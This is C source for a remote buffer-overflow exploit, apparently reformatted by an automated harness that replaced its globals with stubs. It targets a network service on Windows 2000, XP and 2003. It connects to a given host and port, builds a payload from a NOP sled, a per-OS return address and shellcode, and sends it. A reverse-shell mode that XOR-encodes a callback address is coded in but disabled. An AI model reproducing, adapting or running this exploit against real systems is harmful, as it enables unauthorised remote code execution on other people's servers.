#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {short sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  server ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  short USHORT ;
typedef  int ULONG ;
typedef  int SOCKET ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  EOL ; 
 int /*<<< orphan*/  FD_ISSET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_SET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_ZERO (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  MAKEWORD (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  Sleep (int) ; 
 int /*<<< orphan*/  WSACleanup () ; 
 scalar_t__ WSAStartup (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  closesocket (int) ; 
 int /*<<< orphan*/  connect (int,struct sockaddr*,int) ; 
 char* ebx ; 
 char* ebx2 ; 
 void* htonl (int) ; 
 short htons (int) ; 
 int inet_addr (char*) ; 
 int /*<<< orphan*/  memcpy (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  memset (int /*<<< orphan*/ ,int,int) ; 
 char pad ; 
 char* pad2 ; 
 char* payload ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 char* scode ; 
 int select (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int send (int,char*,int,int /*<<< orphan*/ ) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  strcat (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  strcpy (char*,int /*<<< orphan*/ ) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  talk ; 
 int /*<<< orphan*/  usage (char*) ; 
 int /*<<< orphan*/  ver () ; 
 int /*<<< orphan*/  wsadata ; 

int main(int argc,char *argv[])
{
ver();
unsigned long gip;
unsigned short gport;
char *target, *os;
if
(argc>6||argc<3||atoi(argv[1])>3||atoi(argv[1])<1){usage(argv[0]);return -1;
}
if (argc==5){usage(argv[0]);return -1;}
   if (strlen(argv[2])<7){usage(argv[0]);return -1;}
   if (argc==6)
{
       if (strlen(argv[4])<7){usage(argv[0]);return -1;}
}
#ifndef WIN32
if (argc==6)
{
  gip=inet_addr(argv[4])^(long)0x93939393;
 gport=htons(atoi(argv[5]))^(short)0x9393;
}
#define Sleep  sleep
#define SOCKET  int
#define closesocket(s) close(s)
#else
if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf("[+] wsastartup error\n");return -1;}
if (argc==6)
{
 gip=inet_addr(argv[4])^(ULONG)0x93939393;
 gport=htons(atoi(argv[5]))^(USHORT)0x9393;
}
#endif
int ip=htonl(inet_addr(argv[2])), port;
if (argc==4||argc==6){port=atoi(argv[3]);} else port=80;
SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server;
s=socket(AF_INET,SOCK_STREAM,0);
if (s==-1){printf("[+] socket() error\n");return -1;}
if (atoi(argv[1]) == 1){target=ebx;os="Win2k SP4 Server English\n[+] Win2k SP4 Pro.   English\n[+]            Win2k SP- -      -";}
if (atoi(argv[1]) == 2){target=ebx2;os="WinXP SP2  Pro. English\n[+] WinXP SP1a Pro. English\n[+]            WinXP SP-  -    -";}
if (atoi(argv[1]) == 3){target=ebx2;os="Win2003 SP4 Server English\n[+] Win2003 SP- -      -";}
printf("[+] target(s): %s\n",os);
server.sin_family=AF_INET;
server.sin_addr.s_addr=htonl(ip);
server.sin_port=htons(port);
if (argc==6){printf("[+] reverse mode disabled for this exploit\n");
printf("[+] get the source at class101.org and update yourself!\n");return -1;}
connect(s,( struct sockaddr *)&server,sizeof(server));
timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
switch(select(s+1,NULL,&mask,NULL,&timeout))
{
 case -1: {printf("[+] select() error\n");closesocket(s);return -1;}
 case 0: {printf("[+] connect() error\n");closesocket(s);return -1;}
 default:
 if(FD_ISSET(s,&mask))
 {
  printf("[+] connected, constructing the payload...\n");
#ifdef WIN32
  Sleep(1000);
#else
  Sleep(1);
#endif
  strcpy(payload,talk);
  memset(payload+29,0x90,520);
  if (atoi(argv[1]) == 1||atoi(argv[1]) == 2)
  {
   memcpy(payload+29+492,&pad,4);
   memcpy(payload+521+4,target,4);
   memcpy(payload+536+1,pad2,5);
  }
  else
  {
   memcpy(payload+29+485,&pad,4);
   memcpy(payload+514+4,target,4);
   memcpy(payload+529+1,pad2,5);
  }
  strcat(payload,EOL);
  memcpy(payload+36+3,scode,strlen(scode));
  if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 1, the server prolly rebooted.\n");return -1;}
#ifdef WIN32
  Sleep(2000);
#else
  Sleep(2);
#endif

  printf("[+] size of payload: %d\n",strlen(payload));
  printf("[+] payload sent.\n");
  return 0;
 }
}
closesocket(s);
#ifdef WIN32
WSACleanup();
#endif
return 0;
}